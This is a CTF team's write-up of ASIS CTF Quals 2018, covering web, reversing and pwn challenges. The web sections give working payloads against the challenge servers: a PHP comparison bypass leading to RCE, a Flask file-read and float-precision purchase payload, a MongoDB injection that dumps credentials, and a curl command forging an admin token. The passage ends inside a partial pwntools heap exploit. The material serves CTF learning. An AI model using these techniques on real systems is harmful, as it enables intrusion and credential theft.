# ASIS CTF Quals 2018


**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180429-asisctfquals/) of this writeup.**


 - [ASIS CTF Quals 2018](#asis-ctf-quals-2018)
   - [Web](#web)
     - [Nice code (unsolved, written by bookgin)](#nice-code-unsolved-written-by-bookgin)
     - [Bug Flag (bookgin, sces60107)](#bug-flag-bookgin-sces60107)
     - [Good WAF (solved by ysc, written by bookgin)](#good-waf-solved-by-ysc-written-by-bookgin)
     - [Personal Website (solved by sasdf, bookgin, sces60107, written by bookgin)](#personal-website-solved-by-sasdf-bookgin-sces60107-written-by-bookgin)
     - [Sharp eyes (unsolved, written by bookgin, special thanks to @herrera)](#sharp-eyes-unsolved-written-by-bookgin-special-thanks-to-herrera)
     - [Gameshop (unsolved)](#gameshop-unsolved)
   - [rev](#rev)
     - [Warm up (sces60107)](#warm-up-sces60107)
     - [baby C (sces60107)](#baby-c-sces60107)
     - [Echo (sces60107)](#echo-sces60107)
     - [Left or Right? (sces60107)](#left-or-right-sces60107)
     - [Density (sces60107)](#density-sces60107)
   - [pwn](#pwn)
     - [Cat (kevin47)](#cat-kevin47)
     - [Just_sort (kevin47)](#just_sort-kevin47)
     - [message_me (kevin47)](#message_me-kevin47)
     - [Tinypwn (kevin47)](#tinypwn-kevin47)
   - [PPC](#ppc)
     - [Neighbour (lwc)](#neighbour-lwc)
     - [The most Boring (how2hack)](#the-most-boring-how2hack)
     - [Shapiro (shw)](#shapiro-shw)
   - [misc](#misc)
     - [Plastic (sces60107)](#plastic-sces60107)
   - [forensic](#forensic)
     - [Trashy Or Classy (sces60107 bookgin)](#trashy-or-classy-sces60107-bookgin)
       - [first step](#first-step)
       - [second step](#second-step)
       - [third step](#third-step)
     - [Tokyo (sces60107)](#tokyo-sces60107)
   - [crypto](#crypto)
     - [the_early_school (shw)](#the_early_school-shw)
     - [Iran (shw and sasdf)](#iran-shw-and-sasdf)
       - [First-half](#first-half)




## Web

### Nice code (unsolved, written by bookgin)

The challenge is related to PHP code review.

The page will show the error message. All we have to do is bypass the error :)

```
# substr($URL, -10) !== '/index.php'
http://167.99.36.112:8080/admin/index.php
# $URL == '/admin/index.php'
http://167.99.36.112:8080/admin/index.php/index.php
```

Next, we are redirected to http://167.99.36.112:8080/another/index.php?source .

```php
 <?php
include('oshit.php');
$g_s = ['admin','oloco'];
$__ni = $_POST['b'];
$_p = 1;
if(isset($_GET['source'])){
    highlight_file(__FILE__);
        exit;
}
if($__ni === $g_s & $__ni[0] != 'admin'){
    $__dgi = $_GET['x'];
    $__dfi = $_GET;
    foreach($__dfi as $_k_o => $_v){
        if($_k_o == $k_Jk){
            $f = 1;
        }
        if($f && strlen($__dgi)>17 && $_p == 3){
            $k_Jk($_v,$_k_o); //my shell :)
        }
        $_p++;
    }
}else{    
    echo "noob!";
}

```


Also note that the server uses PHP/5.5.9-1ubuntu4.14. Then I got stuck here for DAYS. After a few tries, I think it's impossible to bypass `===`.

However, that's not the case in PHP 5.5.9 due to [this bug](https://bugs.php.net/bug.php?id=69892). Just send a big index, and it will be casted to int. Overflow!

The rest is simple. No need to guess the content in `oshit.php`. Use system to RCE.

Postscript:

1. The bug seems to be famous(infamous) in 2015,2016 PHP CTFs. You can Google the link or bug id and you'll find lots of challenges related to this bug.
2. Always pay attention to the version server used. The current release is PHP 7.2, but the challenge uses PHP 5.5.9.
3. If the condition is impossible to bypass, just dig into the bug databse/source code.
4. The challenge is solved by more than 20 teams, so it must be simple to find a solution.

I've learned a lot. Thanks to this challenge and PHP!


### Bug Flag (bookgin, sces60107)

Get source code by LFI `http://46.101.173.61/image?name=app.py`. It's Python2 + Flask.

```python
from flask import Flask, Response, render_template, session, request, jsonify

app = Flask(__name__)
app.secret_key = open('private/secret.txt').read()

flags = {
	'fake1': {
		'price': 125,
		'coupons': ['fL@__g'],
		'data': 'fake1{this_is_a_fake_flag}'
	},
	'fake2': {
		'price': 290,
		'coupons': ['fL@__g'],
		'data': 'fake2{this_is_a_fake_flag}'
	},
	'asis': {
		'price': 110,
		'coupons': [],
		'data': open('private/flag.txt').read()
	}
}

@app.route('/')
def main():
	if session.get('credit') == None:
		session['credit'] = 0
		session['coupons'] = []
	return render_template('index.html', credit = session['credit'])
	#return 'Hello World!<br>Your Credit is {}<br>Used Coupons is {}'.format(session.get('credit'), session.get('coupons'))

@app.route('/image')
def resouce():
	image_name = request.args.get('name')
	if '/' in image_name or '..' in image_name or 'private' in image_name:
		return 'Access Denied'
	return Response(open(image_name).read(), mimetype='image/png')

@app.route('/pay', methods=['POST'])
def pay():
	data = request.get_json()
	card = data['card']
	coupon = data['coupon']
	if coupon.replace('=','') in session.get('coupons'):
		return jsonify({'result': 'the coupon is already used'})
	for flag in card:
		if flag['count'] <= 0:
			return jsonify({'result':'item count must be greater than zero'})
	discount = 0
	for flag in card:
                if coupon.decode('base64').strip() in flags[flag['name']]['coupons']:
			discount += flag['count'] * flags[flag['name']]['price']
	credit = session.get('credit') + discount
	for flag in card:
		credit -= flag['count'] * flags[flag['name']]['price']
	if credit < 0:
		result = {'result': 'your credit not enough'}
	else:
		result = {'result': 'pay success'}
		result_data = []
		for flag in card:
			result_data.append({'flag': flag['name'], 'data': flags[flag['name']]['data']})
		result['data'] = result_data
		session['credit'] = credit
		session['coupons'].append(coupon.replace('=',''))
	return jsonify(result)

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=80)
```

The first thought comes to my mind is race condition. We can send 2 requests to manipulate the session variables. However, manipulating credit leads to nothing, because it's not dependent on executing orders. Manipulating coupons is useless, neither. Why bother using a coupon twice? Just create another session.

Then I start to dig if there is any logical error. The objective is to make the credit >= 0 when buying the real flag. After some brainstroming, I try to buy 0.01 fake flags, and it works.

Let's test Python floating-point precision.
```python
Python 2.7.14 (default, Jan  5 2018, 10:41:29) 
[GCC 7.2.1 20171224] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 1.335 * 125 + 0.334 * 290 - 1.335 * 125 - 0.334 * 290
1.4210854715202004e-14
```

Isn't it cool and surprising? Note that `1.4210854715202004e-14` is a positive number. For the count of real flag, we can buy `0.0000000...1`.

Payload:
```
{"card":[{"name":"fake1","count":1.335},{"name":"fake2","count":0.334},{"name":"asis","count":0.0000000000000000000000000001}],"coupon":"ZkxAX19n"}
```

Flag: `ASIS{th1@n_3xpens1ve_Fl@G}`

You can abuse Python `NaN` to solve this challenge as well. Refer to [this writeup](https://ctftime.org/writeup/9893).

### Good WAF (solved by ysc, written by bookgin)

The challenge requires us to bypass the WAF on SQL injection.

**Unintended solution:**

When the organizer is fixing the challenge by editing the source code, @ysc's web scanner found `.index.php.swp`, and we got the source code. The flag is there. That's all.

Flag: `ASIS{e279aaf1780c798e55477a7afc7b2b18}`

Never fix anything on the production server directly :)

### Personal Website (solved by sasdf, bookgin, sces60107, written by bookgin)

Firstly dive into `http://206.189.54.119:5000/site.js`. There are 4 interesting pages:

- admin_area
- get/title/1
- get/text/1
- get/image/1

The `admin_area` requires an authorization_token in the header, and the page will check the token. If it's incorrect, an error occurs `Authorization Failed.`

Let's fuzz the three `get` APIs. The title, text seem not injectable and only parse integer until encountering an invalid character. However, image is injectable. The `get/image/0+1` is equal to `get/image/1`. Even `get/image/eval("0+1")` works like a charm. So we got a blind injection here. The backend is Nodejs + express. I'll first guess it's using mongoDB.

Keey moving on. We try to extract the information of the backend, only to find it's in nodejs vm2. There is no `require` so we cannot RCE. Actually versatile @sasdf spent some time on trying to escape the vm, but it seems very hard.
 
Next, we leaked `module` and find `_mongo`, `db`. It's possible to get all collection names via `db.collection.getname()`. Then, use eval and ` this["db"].credentials.find().toArray()` to dump the database. We dump `credentials` and `authorization`:

```
{"_id":{"str":"5ae63ae0a86f623c83fecfb3"},"id":1,"method":"post_data","format":"username=[username]&password=[password]","activate":"false"}
{"_id":{"str":"5ae63ae0a86f623c83fecfb4"},"id":2,"method":"header","format":"md5(se3cr3t|[username]|[password])","activate":"true"}

{"_id":{"str":"5ae63ae0a86f623c83fecfb1"},"id":1,"username":"administrator","password":"H4rdP@ssw0rd?"}
```

Great! The payload:
```sh
curl 'http://206.189.54.119:5000/admin_area' -H "authorization_token:`echo -n 'se3cr3t|administrator|H4rdP@ssw0rd?' | md5sum | cut 
-f1 -d' '`"
```

Flag: `ASIS{3c266f6ccdaaef52eb4a9ab3abc2ca70}`

Postscript: Take a look at Yashar Shahinzadeh's [writeup](https://medium.com/bugbountywriteup/mongodb-injection-asisctf-2018-quals-personal-website-write-up-web-task-115be1344ea2). In fact, the server will send back the error message through the response header `Application-Error`. There is no need to perform blind injection. We are reckless and didn't find this.

Next time, I'll carefully inspect every payload and HTTP status code/headers.

### Sharp eyes (unsolved, written by bookgin, special thanks to @herrera)

The incorrect account/password in the login page will redirect to `error/1`. Missing either account or password parameter redirects to `error/2`.

The source HTML of `error/1`.

```html
<html>
<head>
<script src='/jquery-3.3.1.min.js'></script>
<link href='style.css' rel='stylesheet'>
</head>
<body>
<div class="accordion">
  <dl>
    <dt class="active">
    	
<!-- Filtered output to prevent XSS -->
<script>var user = '1';</script>Invalid credentials were given.
```

If the URL is  `error/hello`, the js part becomes `var user = 'hello';`. Addtionally, some characters `<>",` are filtered, but it's imple to bypass using single quotes and semicolons. 

It's obvious that we have to somehow make the admin trigger this XSS, but how? I guess the admin will read the log in the server, but after a few tries, we found it does't work at all. Ok, so why does variable user mean in the javascript here? Maybe we can inject the XSS payload to the username login page. but it doesn't work, neither.

What if it's not a XSS challenge? I don't think so because:

1. I note that the jQuery is loaded in the error page, but it's not used.
2. There is a XSS filter.

The discovery strongly indicates this is a XSS challenge. However, why does the error code is assigned to a user variable? This does not make sense at all. 

This challenge made me very frustrated.  I think the XSS part is very misleading at the begninning, though it's used after logged in successfully.

It was not unitl the last 30 minutes that we found the error code is vulnerable to SQL injection. The server returns the content but the status code is 500. Thanks to @sasdf 's sharp eyes. I'm too careless to find the SQL injection vulenerability.

SQLmap will dump the database. The DB is SQlite.

Thanks to @herrera in IRC channel:
> sharp eyes was sqli on /error/1, getting username/hash of the user david, logging into him, then using /error/1 as a XSS too, sending it to admin and getting the flag on flag.php

Postscript:

1. Sharp eyes: HTTP status code
2. Some misleading part might be the second stage of the challenge.
3. It a number of teams solve this challenge, it must be not difficult.

### Gameshop (unsolved)

Please refer to [official solution](https://blog.harold.kim/2018/04/asisctf-2018-gameshop-solution).

Acctually, we spent a few hours on MicroDB LFI. Next, I'm trying to find a way to exploit all the possible `die(__FLAG__)`. I know we may use unserialization to create `Affimojas->flag = 0`, since in PHP, `var_dump(0 == "asdasdasd"); // bool(true)` .

However, I cannot find the way to exploit unserilization. In the last 1 hours, @sasdf noted that we can manipulate the first block, but we though we didn't have much time solving this challenge.

There is a long road to go on solving web challnges:)


## rev

### Warm up (sces60107)

This is a warm up challenge. They give you a C file like this.

```C
#define M 37
#define	q (2+M/M)
#define	v (q/q)
#define	ef ((v+q)/2)
#define	f (q-v-ef)
#define k (8-ef)
struct b{int64_t y[13];}S;int m=1811939329,N=1,t[1<<26]={2},a,*p,i,e=73421233,s,c,U=1;g(d,h){for(i=s;i<1<<25;i*=2)d=d*1LL*d%m;for(p=t;p<t+N;p+=s)for(i=s,c=1;i;i--)a=p[s]*(h?c:1LL)%m,p[s]=(m*1U+*p-a)*(h?1LL:c)%m,*p=(a*1U+*p)%m,p++,c=c*1LL*d%m;}l(){while(e/=2){N*=2;U=U*1LL*(m+1)/2%m;for(s=N;s/=2;)g(136,0);for(p=t;p<t+N;p++)*p=*p*1LL**p%m*U%m;for(s=1;s<N;s*=2)g(839354248,1);for(a=0,p=t;p<t+N;)a+=*p<<(e&1),*p++=a%10,a/=10;}}z(n){int y=3,j,c;for(j=2;j<=n;){l();for(c=2;c<=y-1;c++){l();if(y%c==0)break;}if(c==y){l();j++;}y++;}l();return y-1;}main(a, pq) char* pq;{int b=sizeof(S),y=b,j=M;l();int x[M]={b-M-sizeof((short int) a),(b>>v)+(k<<v)+ (v<<(q|ef)) + z(v+(ef<<v)),(z(k*ef)<<v)-pow(ef,f), z(( (j-ef*k)|(ef<<k>>v)/k-ef<<v)-ef),(((y+M)&b)<<(k/q+ef))-z(ef+v),((ef<<k)-v)&y,y*v+v,(ef<<(q*ef-v-(k>>ef)))*q-v,(f<<q)|(ef<<(q*f+k))-j+k,(z(z(z(z(z(v)))))*q)&(((j/q)-(ef<<v))<<q)|(j+(q|(ef<<v))),y|(q+v),(ef<<ef)-v+ef*(((j>>ef)|j)-v+ef-q+v),(z(j&(b<<ef))&(z(v<<v)<<k))-(q<<v)-q,(k<<q)+q,(z(y)>>(ef<<v))+(z(k+v))-q,(z(z(k&ef|j))&b|ef|v<<f<<q<<v&ef>>k|q<<ef<<v|k|q)+z(v<<v)+v,(ef>>v)*q*z(k-v)+z(ef<<ef&q|k)+ef,z(k<<k)&v&k|y+k-v,z(f>>ef|k>>ef|v|k)*(ef>>v)*q,(ef<<k-ef<<v>>q<<ef*ef)-j+(ef<<v),z(ef*k)*z(v<<v)+k-v,z((z(k)<<z(v)))&y|k|v,z(ef<<ef<<v<<v)/ef+z(v<<ef|k|(b>>q)&y-f)-(ef<<q)+(k-v)-ef,k<<(ef+q)/z(ef)*z(q)&z(k<<k)|v,((z(y|j>>k*ef))%ef<<z(v<<v<<v)>>q<<q|j)/ef+v,(j-ef<<ef<<v*z(v>>v<<v)>>ef)/ef%z(k<<j)+q,z(k-v)+k|z(ef<<k>>v<<f)-z(q<<q)*ef>>v,(z(ef|y&j|k)%q|j+ef<<z(k|ef)%k<<q|ef|k<<ef<<q/ef|y/ef+j>>q)&k<<j|ef+v,84,z(v*ef<<ef<<q)*q%ef<<k|k|q-v,((z(20)*v)|(f>>q)|(k<<k))/ef-(ef<<(v*q+ef))-(k<<q)+z(k)-q};while(j--){putchar(x[M-v-j]);}printf(" From ASIS With Love <3\n");return 0;}
```

You can compile the code. But when executing the binary, it just hanging there. So the first step is to understand this code.
It look likes you need to beautify this code. You can count on online tools, but I do this with myself. 


And I found out there is a useless function `l` which seems to waste lots of time. I just deleted that function in the code and compile the code again. Eventualy, I got the flag and the first blood.

The flag is `ASIS{hi_all_w31c0m3_to_ASISCTF}`


### baby C (sces60107)

This challenge give you a obfuscated binary.

It is obvious that they use [movfuscator](https://github.com/xoreaxeaxeax/movfuscator).

It's not easy to reverse such obfuscated binary directly. You will need the help of `qira` or `gdb`. And I choose the former.

But it's still difficult to trace the program flow. After a while, I notice that there is `strncmp` in this binary.

```
...
.text:08049557                 mov     eax, off_83F6170[edx*4]
.text:0804955E                 mov     edx, dword_81F6110
.text:08049564                 mov     [eax], edx
.text:08049566                 mov     esp, off_83F6130
.text:0804956C                 mov     dword_85F61C4, offset strncmp_plt
.text:08049576                 mov     eax, dword_83F6158
.text:0804957B                 mov     eax, off_85F61C8[eax*4]
.text:08049582                 mov     eax, [eax]
...
```

I utilized `qira` to trace the program and realized that part of code is doing `strncmp(input[3:],"m0vfu3c4t0r!",0xc)`

Well, the hint tell us `flag is ASIS{sha1(input[:14])}`

Now we just need the first three byte.

The next step needs patience. you have to trace down the code manually.

Then you can find this

```
...
.text:080498C8                 mov     dl, byte ptr dword_804D050
.text:080498CE                 mov     edx, dword_81F5B70[edx*4]
.text:080498D5                 mov     dword_804D05C, edx
.text:080498DB                 mov     dword_804D058, 'A'
.text:080498E5                 mov     eax, dword_804D05C
.text:080498EA                 mov     edx, dword_804D058
.text:080498F0                 mov     ecx, 8804B21Ch
...
```

If you are familiar with movfuscator, you will know this part of code is trying to compare two bytes. I knew this because I read this [pdf](https://github.com/xoreaxeaxeax/movfuscator/blob/master/slides/domas_2015_the_movfuscator.pdf) in order to solve this challenge.

Now we know it is try to compare the first byte of input to `A`

The rest of this chanllenge is diggin out the other code which try to compare the second and the third byte.

```
...
.text:08049BED                 mov     edx, 0
.text:08049BF2                 mov     dl, byte ptr dword_804D050
.text:08049BF8                 mov     edx, dword_81F5B70[edx*4]
.text:08049BFF                 mov     dword_804D05C, edx
.text:08049C05                 mov     dword_804D058, 'h'
.text:08049C0F                 mov     eax, dword_804D05C
.text:08049C14                 mov     edx, dword_804D058
.text:08049C1A                 mov     ecx, 8804B21Ch
...
.text:08049F17                 mov     edx, 0
.text:08049F1C                 mov     dl, byte ptr dword_804D050
.text:08049F22                 mov     edx, dword_81F5B70[edx*4]
.text:08049F29                 mov     dword_804D05C, edx
.text:08049F2F                 mov     dword_804D058, '_'
.text:08049F39                 mov     eax, dword_804D05C
.text:08049F3E                 mov     edx, dword_804D058
.text:08049F44                 mov     ecx, 8804B21Ch
...
```

Finally, we got `input[:14]` which is `Ah_m0vfu3c4t0r`.

So the flag will be `ASIS{574a1ebc69c34903a4631820f292d11fcd41b906}`
### Echo (sces60107)

You will be given a binary in this challenge. Just try to execute it.
```
$ ./Echo 
Missing argument
$ ./Echo blabla
Error opening blabla!
```

Well, you only get some error message. After using some decompile tool I found this.

```
  if ( v9 <= 1 )
  {
    fwrite("Missing argument\n", 1uLL, 0x11uLL, stderr);
    exit(1);
  }
  if ( !strncmp(*(const char **)(a2 + 8), "GIVEMEFLAG", 0xAuLL) )
  {
    v46 = (signed int)sub_970(v49);
  }
```

It seems like you should put `GIVEMEFLAG` in the first argument.

```
./Echo GIVEMEFLAG
a
a
wtf
wtf
thisisuseless
thisisuseless
```

Well it just echo what you input. But `sub_970` seems interesting. I used gdb to catch return value.

Then I found this function return a string array

`>>[<+<+>>-]<<[->>+<<]>[>>>>>+<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>+<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>+<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>+<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>+<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>+<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>+<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>+<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>+<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>+<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>>>>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]>[+]><<<<<<<<<<<<<<<<<<<<<<<<<<,[.,]`

Obviously, it is `brainfuck`. the last part of this brainfuck string is `[.,]` which will read your input and output to your screen.

before that there a bunch of `[+]>` . It will clean the buffer. 

The goal is clear now. we need to what does it put on the buffer before it remove them.

We can rewrite the brainfuck string to fulfill our requirements

The new brainfuck string will be 
`>>[<+<+>>-]<<[->>+<<]>[>>>>>+<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>+<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>+<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>+<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>+<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>+<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>+<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>+<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>+<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>+<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>[<<<+<+>>>>-]<<<<[->>>>+<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>>>[<<<<+<+>>>>>-]<<<<<[->>>>>+<<<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>[<+<+>>-]<<[->>+<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>>[<<+<+>>>-]<<<[->>>+<<<]>[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]<>>[.>]`

Now the binary will output the flag `flag{_bR41n---,[>.<],+_fxxK__}`

According to the note `Note: flag{whatyoufound}, submit ASIS{sha1(whatyoufound)}`

The true flag is `ASIS{7928cc0d0f66530a42d5d3a06f94bdc24f0492ff}`
### Left or Right? (sces60107)

Just try to execute the given binary.

```
$ ./right_or_left 
What's The Secret Key?
I dont know
invalid key:( try again
```

So it seems like we need a secret key?

Then I levearaged a decompiler to reverse this binary. Unfortunately, I found that it's a `rust` binary.

I am not familar with `rust`. It's difficult to me to fully reverse it. Then I found some interesting strings like `therustlanguageisfun` and `superkeymysecretkeygivemetheflagasisctfisfun`

I try to input those strings

```
$ ./right_or_left 
What's The Secret Key?
therustlanguageisfun
ASIS{that_is_not_the_real_flag}
$ ./right_or_left 
What's The Secret Key?
superkey                                                
ASIS{be_noughty_step_closer_to_see_the_flag}
$ ./right_or_left 
What's The Secret Key?
mysecretkey
ASIS{imagine_a_flag_in_a_watermelon_how_can_you_capture_it}
```

It seems like they are all fake flag.

Now there is two ways to deal with this chellange. The way I take is finding how this binary output those fake flag.

Using `gdb` and `IDA pro`, I found that those function which will generate fake flag is located at these position.

![](https://i.imgur.com/Riza8hO.png)

Well, `sub_9320` seems to be a good target to analysis. Just use `gdb` and change your $rip. Then, the real flag will output to your screen

Now you have the flag `ASIS{Rust_!s_Right_i5_rust_!5_rust_but_rust_!s_no7_left}
`

There is another way to capture the flag. In this way, you should find out the real secret key.

Practically, you need to locate the key-checking function.

Track those fake key. you will find out the key-checking function. It is located at `sub_83c0`

Then you can trace this function and easily get the real secret key which is `sscsfuntnguageisfunsu`
### Density (sces60107)

In this challenge you will get a binary and a encrypted flag.

This chllenge is not difficult at all. The binary name is "b64pack".

You can just try base64
```
$ base64 short_adff30bd9894908ee5730266025ffd3787042046dd30b61a78e6cc9cadd72191 
O++h+b+qcASIS++e01d+c4Nd+cGoLD+cASIS+c1De4+c4H4t+cg0e5+cf0r+cls+d++gdI++j+kM
+vb++fD9W+q/Cg==
```

There is string while looks like flag
`ASIS++e01d+c4Nd+cGoLD+cASIS+c1De4+c4H4t+cg0e5+cf0r+cls+d++gdI++j+kM
+vb++fD9W+q/Cg==`

We still need to reverse the binary. You can divide this binary into three part.

The first part:
`input=randomstr+input+flag`

The second part:
```python
newinput=""
for i in input:
  if i in "@$_!\"#%&'()*+,-./:;<=>?\n":
    newinput+="+"+chr(ord('a')+"@$_!\"#%&'()*+,-./:;<=>?\n".index(i))
  elif i in "[\\]^{|}~`\t":
    newinput+="++"+chr(ord('a')+"@$_!\"#%&'()*+,-./:;<=>?\n".index(i))
  else:
    newinput+=i
```
The third part:
```
output=newinput.decode("base64")
```

Now you know how to reconstruct the flag.
The flag is `ASIS{01d_4Nd_GoLD_ASIS_1De4_4H4t_g0e5_f0r_ls!}`
## pwn

### Cat (kevin47)

* I am a idiot that can't think, so I used the most hardcore way :)
* Use name and kind to leak heap, libc, stack, canary
* fastbin dup attack to stack twice in order to overwrite return address

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('178.62.40.102', 6000)

def create(name, kind, age, nonl=0, stack=''):
    if name == '':
        r.recvrepeat(1)
    if stack:
        r.send(stack)
    else:
        r.send('0001')
    if name == '':
        r.sendlineafter('>', '')
        r.sendlineafter('>', '')
    else:
        r.send(name.ljust(0x16, '\x00'))
        r.send(kind.ljust(0x16, '\x00'))
    r.send(str(age).rjust(4, '0'))

def edit(idx, name, kind, age, modify, sp=1):
    r.send('0002')
    r.send(str(idx).rjust(4, '0'))
    if sp:
        r.recvrepeat(1)
        r.sendline(name)
        r.sendlineafter('>', kind)
    else:
        r.send(name.ljust(0x16, '\x00'))
        r.send(kind.ljust(0x16, '\x00'))
    r.send(str(age).rjust(4, '0'))
    r.send(modify.ljust(4, '\x00'))

def print_one(idx):
    r.recvrepeat(2)
    r.send('0003')
    r.sendlineafter('>', str(idx))
    return r.recvuntil('---', drop=True)

def delete(idx):
    r.send('0005')
    r.send(str(idx).rjust(4, '0'))

create('a'*0x10, 'a'*0x10, 1)
create('a'*0x10, 'a'*0x10, 1)
#create('a'*0x10, 'a'*0x10, 1)
create(flat(0, 0x21), flat(0, 0x21), 1)
create('a'*0x10, 'a'*0x10, 1)
create('a'*0x10, 'a'*0x10, 1)
create('a'*0x10, 'a'*0x10, 1)
delete(4)
delete(5)
# set ptr
edit(0, 'b', 'b', 2, 'n')
create('', '', 1)
edit(0, 'b', 'b', 2, 'n', sp=1)
x = print_one(4)
xx = re.findall('kind: (.*)\nold', x)[0]
